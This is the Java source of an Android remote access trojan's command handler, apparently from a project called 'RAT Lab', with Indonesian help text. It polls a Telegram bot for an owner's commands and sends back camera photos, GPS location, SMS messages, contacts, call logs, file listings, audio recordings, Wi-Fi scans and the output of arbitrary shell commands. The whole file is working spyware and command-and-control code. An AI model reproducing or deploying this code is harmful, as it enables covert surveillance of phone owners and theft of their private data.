package com.ratlab;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CommandHandler {

    private static final String TAG = "CommandHandler";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    private final Context ctx;
    private final String token;
    private final long ownerId;
    private final OkHttpClient http;
    private long lastUpdateId = 0;

    private final CameraModule camera;
    private final LocationModule location;
    private final SmsModule sms;
    private final ContactModule contacts;
    private final FileModule files;
    private final ShellModule shell;
    private final AudioModule audio;
    private final LockModule lock;

    public CommandHandler(Context ctx, String token, long ownerId) {
        this.ctx = ctx;
        this.token = token;
        this.ownerId = ownerId;
        this.http = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();

        this.camera = new CameraModule(ctx);
        this.location = new LocationModule(ctx);
        this.sms = new SmsModule(ctx);
        this.contacts = new ContactModule(ctx);
        this.files = new FileModule(ctx);
        this.shell = new ShellModule(ctx);
        this.audio = new AudioModule(ctx);
        this.lock = new LockModule(ctx);
    }

    public void pollUpdates() throws IOException {
        String url = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=10&offset=" + (lastUpdateId + 1);
        Request req = new Request.Builder().url(url).get().build();
        try (Response res = http.newCall(req).execute()) {
            if (!res.isSuccessful() || res.body() == null) return;
            String body = res.body().string();
            JSONObject json = new JSONObject(body);
            JSONArray result = json.optJSONArray("result");
            if (result == null) return;
            for (int i = 0; i < result.length(); i++) {
                JSONObject update = result.getJSONObject(i);
                long updateId = update.getLong("update_id");
                if (updateId > lastUpdateId) lastUpdateId = updateId;
                handleUpdate(update);
            }
        } catch (Exception e) {
            Log.e(TAG, "pollUpdates error: " + e.getMessage());
        }
    }

    private void handleUpdate(JSONObject update) {
        try {
            JSONObject message = update.optJSONObject("message");
            if (message == null) return;
            long fromId = message.optJSONObject("from").optLong("id");
            if (fromId != ownerId) return;

            long chatId = message.optJSONObject("chat").optLong("id");
            String text = message.optString("text", "").trim();
            if (text.isEmpty()) return;

            String cmd = text.split(" ")[0].toLowerCase();
            String args = text.length() > cmd.length() ? text.substring(cmd.length() + 1).trim() : "";

            String response = handleCommand(cmd, args);
            if (response != null && !response.isEmpty()) {
                sendMessage(chatId, response);
            }
        } catch (Exception e) {
            Log.e(TAG, "handleUpdate error: " + e.getMessage());
        }
    }

    private String handleCommand(String cmd, String args) {
        try {
            switch (cmd) {
                case "/start":
                case "/help":
                    return "RAT Lab — Command List:\n\n"
                            + "/ping - cek koneksi\n"
                            + "/info - info device\n"
                            + "/camera - foto kamera belakang\n"
                            + "/camerafront - foto kamera depan\n"
                            + "/location - GPS\n"
                            + "/sms - SMS terakhir\n"
                            + "/smsall - semua SMS\n"
                            + "/contacts - kontak\n"
                            + "/calllog - log panggilan\n"
                            + "/files - list file\n"
                            + "/shell <cmd> - eksekusi shell\n"
                            + "/apps - list aplikasi\n"
                            + "/torch - flashlight\n"
                            + "/vibrate <ms> - getar\n"
                            + "/tts <teks> - text-to-speech\n"
                            + "/volume <level> - set volume\n"
                            + "/brightness <level> - set brightness\n"
                            + "/play <url> - putar audio\n"
                            + "/audio-max - volume max\n"
                            + "/speak <detik> - rekam audio\n"
                            + "/wifi - info wifi\n"
                            + "/wifiscan - scan wifi\n"
                            + "/processes - list proses\n"
                            + "/uptime - uptime\n"
                            + "/whoami - user\n"
                            + "/env - environment";

                case "/ping":
                    return "Pong! Bot aktif.";

                case "/info":
                    return DeviceInfo.get(ctx);

                case "/camera":
                    return camera.takePicture(false);

                case "/camerafront":
                    return camera.takePicture(true);

                case "/location":
                    return location.get();

                case "/sms":
                    return sms.list(5);

                case "/smsall":
                    return sms.list(100);

                case "/contacts":
                    return contacts.list();

                case "/calllog":
                    return contacts.callLog();

                case "/files":
                    return files.list(args.isEmpty() ? "/sdcard" : args);

                case "/shell":
                    if (args.isEmpty()) return "Format: /shell <cmd>";
                    return shell.exec(args);

                case "/apps":
                    return files.listApps();

                case "/torch":
                    return TorchControl.toggle(ctx);

                case "/vibrate":
                    return VibrateControl.vibrate(ctx, args);

                case "/tts":
                    return TtsControl.speak(ctx, args);

                case "/volume":
                    return AudioModule.setVolume(ctx, args);

                case "/brightness":
                    return BrightnessControl.set(ctx, args);

                case "/play":
                    return audio.play(args);

                case "/audio-max":
                    return audio.maxVolume();

                case "/speak":
                    return audio.record(args);

                case "/wifi":
                    return NetworkInfo.getWifi(ctx);

                case "/wifiscan":
                    return NetworkInfo.scanWifi(ctx);

                case "/processes":
                    return shell.exec("ps -A | head -50");

                case "/uptime":
                    return shell.exec("uptime");

                case "/whoami":
                    return shell.exec("id");

                case "/env":
                    return shell.exec("env | head -30");

                default:
                    return null;
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private void sendMessage(long chatId, String text) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", text.length() > 4000 ? text.substring(0, 4000) : text);

            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendMessage")
                    .post(RequestBody.create(body.toString(), JSON))
                    .build();
            http.newCall(req).execute().close();
        } catch (Exception e) {
            Log.e(TAG, "sendMessage error: " + e.getMessage());
        }
    }
}
